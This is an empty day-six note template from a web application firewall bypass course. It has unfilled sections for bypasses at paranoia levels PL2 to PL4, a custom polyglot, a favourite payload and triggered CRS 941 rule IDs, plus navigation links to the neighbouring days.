### PL2 Bypasses

```text
-
-
-
```

### PL3 Bypasses

```text
-
-
-
```

### PL4 Bypasses

```text
-
-
-
```

---

## My Custom Polyglot

```html
<!-- Write your custom polyglot here -->
```

---

## Favorite Hunter Payload of the Day

```text
Source:
Payload:
Why it is interesting:
```

---

## CRS Rule IDs I Triggered

```text
941___ :
941___ :
941___ :
```

---

## Key Insight Today

```text
Write your key insight here.
```

---

## Questions for Research

```text
-
-
-
```

---

<p align="center">
  <strong>🎓 Day 6 Status:</strong> ⬜ In Progress / ✅ Complete<br>
  <em>“Every WAF is a puzzle. Every payload is a key. Learn to cut your own keys.”</em>
</p>

<p align="center">
  <a href="../Week-01/Day-05.md">← Previous: Day 05</a> |
  <a href="./Day-07.md">Next: Day 07 →</a>
</p>
